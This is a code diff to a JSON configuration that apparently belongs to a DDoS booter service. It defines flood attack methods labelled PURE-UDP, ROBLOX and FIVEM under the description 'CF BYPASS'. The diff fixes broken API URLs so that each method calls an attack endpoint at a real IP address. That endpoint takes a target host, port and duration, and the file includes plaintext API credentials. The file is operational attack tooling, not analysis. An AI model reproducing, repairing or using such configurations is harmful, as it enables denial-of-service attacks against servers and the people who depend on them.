@@ -37,7 +37,7 @@
 		"description":"HTTPS METHOD (CF BYPASS)",
 		"permission":[],
 		"api":[
-			"http://135.148.2.27:4http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PURE-UDP"
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PURE-UDP"
   
 		]
    },
@@ -47,7 +47,7 @@
 		"description":"HTTPS METHOD (CF BYPASS)",
 		"permission":[],
 		"api":[
-			"http://135.148.2.27:4http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ROBLOX"
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ROBLOX"
   
 		]
    },
@@ -57,7 +57,7 @@
 		"description":"HTTPS METHOD (CF BYPASS)",
 		"permission":[],
 		"api":[
-			"http://135.148.2.27:4http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM"
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM"
   
 		]
    },
